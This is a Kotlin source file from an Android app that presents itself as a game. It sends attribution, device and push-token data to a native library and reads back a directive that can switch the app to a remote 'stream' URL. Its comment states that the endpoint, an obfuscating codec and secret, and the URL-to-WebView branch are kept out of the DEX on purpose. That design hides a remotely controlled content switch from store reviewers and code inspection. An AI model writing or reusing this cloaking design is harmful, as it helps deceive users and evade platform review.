package com.stormreachhaven.stormreachgame.push

import com.stormreachhaven.stormreachgame.NativeGate
import com.stormreachhaven.stormreachgame.net.Env
import com.stormreachhaven.stormreachgame.net.ConfigResult
import com.stormreachhaven.stormreachgame.screens.Trace
import com.stormreachhaven.stormreachgame.screens.UserAgent
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject

/**
 * Config client, fully native-gated.
 *
 * Everything — the endpoint, the veil envelope codec + secret, the HTTPS POST
 * and the stream/native verdict — lives in [NativeGate] (libgate.so). Kotlin's
 * only job here is to hand the collected attribution + device fields to the
 * gate and read back the directive. No endpoint string, no codec, no network
 * call and no "ok+url → WebView" branch exists anywhere in the DEX.
 */
class ConfigClient {

    suspend fun fetchViaGate(
        attributionJson: String,
        afId: String,
        os: String,
        locale: String,
        pushToken: String?,
        firebaseProject: String,
    ): ConfigResult = withContext(Dispatchers.IO) {
        if (!NativeGate.isReady) {
            Trace.w(TAG, "native gate not loaded")
            return@withContext ConfigResult.unreachable()
        }

        val directive = runCatching {
            NativeGate.route(
                attributionJson,
                afId,
                Env.bundleId,
                os,
                locale,
                pushToken.orEmpty(),
                firebaseProject,
                UserAgent.value,
            )
        }.getOrNull()

        if (directive.isNullOrBlank()) {
            Trace.w(TAG, "gate returned nothing")
            return@withContext ConfigResult.unreachable()
        }
        Trace.i(TAG, "gate directive received")
        parseDirective(directive)
    }

    private fun parseDirective(directive: String): ConfigResult = try {
        val d = JSONObject(directive)
        when (d.optString("mode")) {
            "stream" -> {
                val url = d.optString("url")
                if (url.isBlank()) ConfigResult.native()
                else ConfigResult.stream(url, d.optLong("expires", 0L))
            }
            "unreachable" -> ConfigResult.unreachable()
            else -> ConfigResult.native()
        }
    } catch (e: Exception) {
        ConfigResult.native()
    }

    private companion object { const val TAG = "ConfigClient" }
}
